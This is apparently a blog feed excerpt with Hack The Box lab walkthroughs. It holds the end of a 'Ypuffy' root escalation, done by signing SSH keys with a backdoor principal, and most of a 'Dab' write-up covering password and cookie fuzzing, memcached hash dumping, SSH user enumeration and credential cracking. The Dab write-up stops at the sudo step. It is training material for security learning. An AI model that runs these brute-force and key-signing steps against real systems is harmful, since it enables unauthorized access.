#IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! PasswordAuthentication no #PermitEmptyPasswords no # Change to no to disable s/key passwords ChallengeResponseAuthentication no AllowAgentForwarding no AllowTcpForwarding no #GatewayPorts no X11Forwarding no #X11DisplayOffset 10 #X11UseLocalhost yes #PermitTTY yes #PrintMotd yes #PrintLastLog yes #TCPKeepAlive yes #UseLogin no #PermitUserEnvironment no #Compression delayed #ClientAliveInterval 0 #ClientAliveCountMax 3 #UseDNS no #PidFile /var/run/sshd.pid #MaxStartups 10:30:100 #PermitTunnel no #ChrootDirectory none #VersionAddendum none # no default banner path #Banner none # override default of no subsystems Subsystem sftp /usr/libexec/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs # X11Forwarding no # AllowTcpForwarding no # PermitTTY no # ForceCommand cvs server This part : So that http service is responsible for some ssh authentication stuff , and we can request keys from /sshauth?type=keys&amp;amp;username= and principals from /sshauth?type=principals&amp;amp;username= , requesting keys for root gives us no response , but requesting the principal we get 3m3rgencyB4ckd00r Generating and signing ssh keys , Getting root So now we have root’s principal 3m3rgencyB4ckd00r. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them. The problem is , as alice1978 we are not authorized to do this. On linux we could check if we can run elevated commands with sudo -l but here there’s no sudo , instead of that there’s a command called doas , if we check the config file for it : We can run ssh-keygen as userca without password. First step is to create ssh keys for alice1978 ssh-keygen -t rsa -f /tmp/id_rsa Then we need the certificate (ca) in /home/userca/ so we will cd there And sign the ssh keys we have just created as root doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub -s for certificate , -I for identity and -n for principal Finally we will ssh as root : ssh -i /tmp/id_rsa root@localhost And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Dab Next Hack The Box write-up : Hack The Box - Giddy</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/ypuffy/0.png" /></entry><entry><title type="html">Hack The Box - Dab</title><link href="http://localhost:4000/hack-the-box/dab/" rel="alternate" type="text/html" title="Hack The Box - Dab" /><published>2019-02-02T00:00:00+02:00</published><updated>2019-02-02T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/dab</id><content type="html" xml:base="http://localhost:4000/hack-the-box/dab/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-dab-retired-and-this-is-my-write-up-dab-was-a-nice-box-a-hard-one-but-it-had-some-funny-stuff-too--getting-user-was-really-annoying-because-it-had-a-lot-of-rabbit-holes-root-was-much-better-its-a-linux-box-and-its-ip-is-10101086-so-lets-jump-right-in&quot;&gt;Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-by-running-nmap&quot;&gt;As always we will start by running nmap&lt;/h4&gt;
&lt;h4 id=&quot;note--i-added-the-ip-to-etchosts-as-dabhtb&quot;&gt;note : I added the ip to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as dab.htb&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC dab.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/dab/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-find-ftp-on-port-21--ssh-on-port-22--http-on-port-80-and-8080-both-of-them-are-nginx&quot;&gt;We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx.&lt;/h4&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-ftp-server&quot;&gt;Let’s take a look at the ftp server.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ftp&quot;&gt;FTP&lt;/h3&gt;
&lt;h4 id=&quot;anonymous-login-succeeds--then-by-listing-the-files-we-only-see-one-file-dabjpg&quot;&gt;anonymous login succeeds , then by listing the files we only see one file &lt;code class=&quot;highlighter-rouge&quot;&gt;dab.jpg&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-download-it-get-dabjpg-then-we-will-take-a-look-at-that-image&quot;&gt;We will download it &lt;code class=&quot;highlighter-rouge&quot;&gt;get dab.jpg&lt;/code&gt; then we will take a look at that image.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/dab.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nothing-really-special--maybe-steganography--lets-try-steghide&quot;&gt;Nothing really special , maybe steganography ? Let’s try steghide&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;steghide info dab.jpg&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/dab/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-for-password-i-left-it-blank-and-it-was-accepted-&quot;&gt;And for password I left it blank and it was accepted !&lt;/h4&gt;
&lt;h4 id=&quot;next-step-is-to-extract-that-txt-file&quot;&gt;Next step is to extract that txt file&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;steghide extract -sf dab.jpg&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/dab/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;cool-lets-cat-it&quot;&gt;Cool let’s &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and--nope&quot;&gt;And , Nope…&lt;/h4&gt;
&lt;h4 id=&quot;so-we-just-got-trolled--next-thing-is-to-look-at-http&quot;&gt;So we just got trolled , next thing is to look at http&lt;/h4&gt;
&lt;h4 id=&quot;check-out-my-steganography-list&quot;&gt;Check out my &lt;a href=&quot;/lists/stego&quot;&gt;steganography list&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;on-port-80-theres-a-login-page&quot;&gt;On port 80 there’s a login page.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-port-8080-tells-us--access-denied-password-authentication-cookie-not-set&quot;&gt;And port 8080 tells us : &lt;code class=&quot;highlighter-rouge&quot;&gt;Access denied: password authentication cookie not set&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;bruteforcing-sub-directories-with-gobuster-wasnt-helpful--port-80-had-only-login-and-login-normal-stuff&quot;&gt;Bruteforcing sub directories with gobuster wasn’t helpful , port 80 had only &lt;code class=&quot;highlighter-rouge&quot;&gt;/login&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/login&lt;/code&gt;. Normal stuff&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-port-8080-had-nothing&quot;&gt;And port 8080 had nothing.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-port-80&quot;&gt;HTTP port 80&lt;/h3&gt;
&lt;h4 id=&quot;lets-enumerate-the-first-port-and-see-what-we-can-get&quot;&gt;Let’s enumerate the first port and see what we can get.&lt;/h4&gt;
&lt;h4 id=&quot;the-most-common-credentials-adminadmin-didnt-work-and-we-get-error-login-failed&quot;&gt;The most common credentials &lt;code class=&quot;highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; didn’t work and we get &lt;code class=&quot;highlighter-rouge&quot;&gt;Error: Login failed&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-we-intercept-the-request-with-burp-we-will-see-that-the-login-process-is-being-handled-through-a-post-request-with-the-parameters-username-and-password&quot;&gt;If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;at-this-point-we-can-bruteforce-passwords-with-hydra--but-instead-of-that-i-just-used-zap-fuzzer--you-can-also-use-burp-intruder-but-its-very-slow-in-the-community-version&quot;&gt;At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;fuzzing-with-zap&quot;&gt;Fuzzing with ZAP&lt;/h3&gt;
&lt;h4 id=&quot;first-thing-to-mention-is-the-wordlist--because-we-are-bruteforcing-remotely-its-better-to-use-a-small-wordlist-so-we-wont-use-rockyou-here-i-used-darkweb2017-top10000txt-from-seclists&quot;&gt;First thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt&quot;&gt;darkweb2017-top10000.txt&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;Seclists&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;lets-start-zap-and-intercept-the-request-again&quot;&gt;Let’s start zap and intercept the request again.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-right-click--attack--fuzzer--after-that-we-highlight-the-place-we-want-to-fuzz--that-will-be-the-password-parameter-value&quot;&gt;Then right click –&amp;gt; attack –&amp;gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;add--add-then-we-paste-the-wordlist-contents&quot;&gt;Add –&amp;gt; Add then we paste the wordlist contents.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/14.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/dab/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;all-the-responses-will-be-200-and-542-bytes--except-one-response-302-and-209-bytes--for-the-value-password1-so-thats-the-password&quot;&gt;all the responses will be &lt;code class=&quot;highlighter-rouge&quot;&gt;200&lt;/code&gt; and 542 bytes , except one response &lt;code class=&quot;highlighter-rouge&quot;&gt;302&lt;/code&gt; and 209 bytes , for the value &lt;code class=&quot;highlighter-rouge&quot;&gt;Password1&lt;/code&gt; so that’s the password.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-get-it-in--but-&quot;&gt;And we get it in , but …&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nothing-interesting--was-this-port-important--correct-me-if-im-wrong&quot;&gt;Nothing interesting , was this port important ? correct me if i’m wrong.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-port-8080&quot;&gt;HTTP port 8080&lt;/h3&gt;
&lt;h4 id=&quot;moving-on-to-the-next-http-port--lets-intercept-the-request-with-burp-and-see-what-can-we-do-with-that-password-authentication-cookie&quot;&gt;Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/dab/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-add-a-cookie-and-name-it-password--value-can-be-anything-were-just-testing&quot;&gt;Let’s add a cookie and name it password , value can be anything we’re just testing&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/20.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/dab/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-another-message--access-denied-password-authentication-cookie-incorrect&quot;&gt;We got another message : &lt;code class=&quot;highlighter-rouge&quot;&gt;Access denied: password authentication cookie incorrect&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;so-we-just-need-to-get-the-right-value-of-the-cookie-and-we-will-get-in&quot;&gt;So we just need to get the right value of the cookie and we will get in.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-use-wfuzz-to-fuzz-the-cookie&quot;&gt;We will use wfuzz to fuzz the cookie&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-terminate-it-immediately-and-look-how-can-we-filter-the-output&quot;&gt;Then we will terminate it immediately and look how can we filter the output&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;all-the-responses-has-324-chars-so-we-will-add---hh-324-and-this-will-not-show-us-any-response-with-324-chars&quot;&gt;All the responses has &lt;code class=&quot;highlighter-rouge&quot;&gt;324 chars&lt;/code&gt; so we will add &lt;code class=&quot;highlighter-rouge&quot;&gt;--hh 324&lt;/code&gt; and this will not show us any response with 324 chars&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/dab/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;secret-gave-us-a-response-of-540--lets-try-in-burp&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;secret&lt;/code&gt; gave us a response of 540 , let’s try in burp&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/dab/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;next-step-is-to-add-the-cookie--you-can-use-any-cookie-editor-after-that-we-get-this-page&quot;&gt;next step is to add the cookie , you can use any cookie editor. after that we get this page.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;finally-we-got-something&quot;&gt;Finally we got something&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;memcached&quot;&gt;memcached&lt;/h3&gt;
&lt;h4 id=&quot;the-very-first-thing-we-see-is--status-of-cache-engine-online&quot;&gt;The very first thing we see is : “Status of cache engine: Online”&lt;/h4&gt;
&lt;h4 id=&quot;cache-engine--after-some-googling-we-will-find-a-software-called-memcached&quot;&gt;cache engine ? after some googling we will find a software called memcached&lt;/h4&gt;
&lt;h4 id=&quot;httpsdownloadsmysqlcomdocsmysql-memcached-ena4pdf&quot;&gt;&lt;a href=&quot;https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf&quot;&gt;https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects.
 -page 1&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;By default, memcached uses the following settings:
•  Memory allocation of 64MB
•  Listens for connections on all network interfaces, using port 11211
•  Supports a maximum of 1024 simultaneous connections
 -page 5&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-know-that-memcached-runs-on-port-11211--lets-try-any-port-to-test&quot;&gt;So we know that memcached runs on port 11211 , let’s try any port to test&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/27.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/dab/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-an-internal-server-error&quot;&gt;We get an internal server error&lt;/h4&gt;
&lt;h4 id=&quot;now-lets-try-port-11211&quot;&gt;Now let’s try port 11211&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/29.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/dab/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-output--error-because-we-didnt-send-a-valid-command--but-thats-a-confirmation-that-the-port-is-right&quot;&gt;We get &lt;code class=&quot;highlighter-rouge&quot;&gt;output : ERROR&lt;/code&gt; because we didn’t send a valid command , but that’s a confirmation that the port is right.&lt;/h4&gt;
&lt;h4 id=&quot;now-we-need-to-know-what-to-put-in-line-to-send&quot;&gt;Now we need to know what to put in “line to send”&lt;/h4&gt;
&lt;h4 id=&quot;by-looking-at-this-cheat-sheet--the-first-command-we-see-is-get-which-reads-a-value--first-time-i-did-this-box-i-guessed-it--just-typed-get-users-and-it-worked-but-the-right-way-to-do-it-is-to-query-the-memory-statistics-with-stats-slabs-as-mentioned-in-the-cheat-sheet&quot;&gt;By looking at this &lt;a href=&quot;https://lzone.de/cheat-sheet/memcached&quot;&gt;cheat sheet&lt;/a&gt; , the first command we see is &lt;code class=&quot;highlighter-rouge&quot;&gt;get&lt;/code&gt; which reads a value , first time i did this box i guessed it , just typed &lt;code class=&quot;highlighter-rouge&quot;&gt;get users&lt;/code&gt; and it worked but the right way to do it is to query the memory statistics with &lt;code class=&quot;highlighter-rouge&quot;&gt;stats slabs&lt;/code&gt; (as mentioned in the cheat sheet)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/31.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/dab/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;STAT 1:chunk_size 96
STAT 1:chunks_per_page 10922
STAT 1:total_pages 1
STAT 1:total_chunks 10922
STAT 1:used_chunks 0
STAT 1:free_chunks 10922
STAT 1:free_chunks_end 0
STAT 1:mem_requested 0
STAT 1:get_hits 0
STAT 1:cmd_set 0
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT 16:chunk_size 2904
STAT 16:chunks_per_page 361
STAT 16:total_pages 1
STAT 16:total_chunks 361
STAT 16:used_chunks 1
STAT 16:free_chunks 360
STAT 16:free_chunks_end 0
STAT 16:mem_requested 2880
STAT 16:get_hits 0
STAT 16:cmd_set 2
STAT 16:delete_hits 0
STAT 16:incr_hits 0
STAT 16:decr_hits 0
STAT 16:cas_hits 0
STAT 16:cas_badval 0
STAT 16:touch_hits 0
STAT 26:chunk_size 27120
STAT 26:chunks_per_page 38
STAT 26:total_pages 1
STAT 26:total_chunks 38
STAT 26:used_chunks 1
STAT 26:free_chunks 37
STAT 26:free_chunks_end 0
STAT 26:mem_requested 24699
STAT 26:get_hits 440
STAT 26:cmd_set 7
STAT 26:delete_hits 0
STAT 26:incr_hits 0
STAT 26:decr_hits 0
STAT 26:cas_hits 0
STAT 26:cas_badval 0
STAT 26:touch_hits 0
STAT active_slabs 3
STAT total_malloced 3127416
END

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;by-looking-at-the-slab-with-id-26-we-see-that-the-chunk-size-of-it-is-27120--lets-dump-the-keys-for-this-slab&quot;&gt;By looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stats cachedump 26 0&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;0-for-no-result-limit&quot;&gt;0 for no result limit&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/33.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/dab/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-item-users&quot;&gt;We get ITEM users&lt;/h4&gt;
&lt;h4 id=&quot;so-we-do-get-users--however-you-can-just-guess-it-like-i-said-we-get-a-huge-json-output-of-usernames-and-password-hashes&quot;&gt;So we do &lt;code class=&quot;highlighter-rouge&quot;&gt;get users&lt;/code&gt; , however you can just guess it like I said. We get a huge json output of usernames and password hashes.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/35.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/dab/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ssh-enumeration-and-getting-user&quot;&gt;SSH enumeration and getting user&lt;/h3&gt;
&lt;h4 id=&quot;lets-copy-that-output-and-save-it-on-our-box-i-saved-it-in-a-file-and-called-it-userstxt&quot;&gt;Let’s copy that output and save it on our box. I saved it in a file and called it users.txt&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat users.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/dab/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-its-a-lot-of-unorganized-data--3-or-more-pages-like-this&quot;&gt;And it’s a lot of unorganized data , 3 or more pages like this.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-use-a-python-module-called-jsontool-to-get-a-more-clear-output&quot;&gt;we will use a python module called json.tool to get a more clear output&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat users.txt | python -m json.tool &amp;gt; users2.txt&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;cat users2.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/dab/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-its-nice-now-lets-make-a-seperate-file-for-users-to-use-them-as-a-list-to-bruteforce-ssh--and-another-seperate-file-for-hashes-to-crack-them&quot;&gt;And it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat users2.txt | cut -d &quot;:&quot; -f 1 | cut -d '&quot;' -f 2 &amp;gt; usernames.txt&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;cat users2.txt | cut -d &quot;:&quot; -f 2 | cut -d '&quot;' -f 2 &amp;gt; hashes.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/dab/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-bruteforce-ssh-we-will-use-a-metasploit-module-called-ssh_enumusers&quot;&gt;To bruteforce ssh we will use a metasploit module called &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh_enumusers&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;use auxiliary/scanner/ssh/ssh_enumusers&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;set RHOSTS dab.htb&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;set USER_FILE usernames.txt&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;set THREADS 20&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/dab/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-will-run-for-a-while--then-it-will-tell-us-that-it-found-the-user-genevieve&quot;&gt;It will run for a while , then it will tell us that it found the user &lt;code class=&quot;highlighter-rouge&quot;&gt;genevieve&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-need-to-get-the-password-of-that-user-you-can-use-john--hashcat-or-online-crackers--however-i-have-already-cracked-them-and-only-few-ones-are-crackable-&quot;&gt;now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-need-to-know-which-one-of-these-passwords-is-genevieves-password--so-we-will-grep-for-genevieve-in-users2txt-then-we-will-grep-for-the-hash-in-cracked-hashestxt&quot;&gt;Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in &lt;code class=&quot;highlighter-rouge&quot;&gt;users2.txt&lt;/code&gt; then we will grep for the hash in &lt;code class=&quot;highlighter-rouge&quot;&gt;cracked-hashes.txt&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-we-have-valid-credentials-genevieveprincess1--lets-ssh&quot;&gt;And finally we have valid credentials &lt;code class=&quot;highlighter-rouge&quot;&gt;genevieve:Princess1&lt;/code&gt; , let’s ssh&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;finally--we-owned-user-&quot;&gt;Finally , we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;more-enumeration&quot;&gt;More enumeration&lt;/h3&gt;
&lt;h4 id=&quot;we-have-a-password--lets-try-sudo--l--and-we-see-that-we-can-run-this-binary-as-root-usrbintry_harder--and-as-the-name-said--we-should-really-try-harder&quot;&gt;We have a password , let’s try &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; , and we see that we can run this binary as root &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/try_harder&lt;/code&gt; , and as the name said … we should really try harder.&lt;/h4&gt;
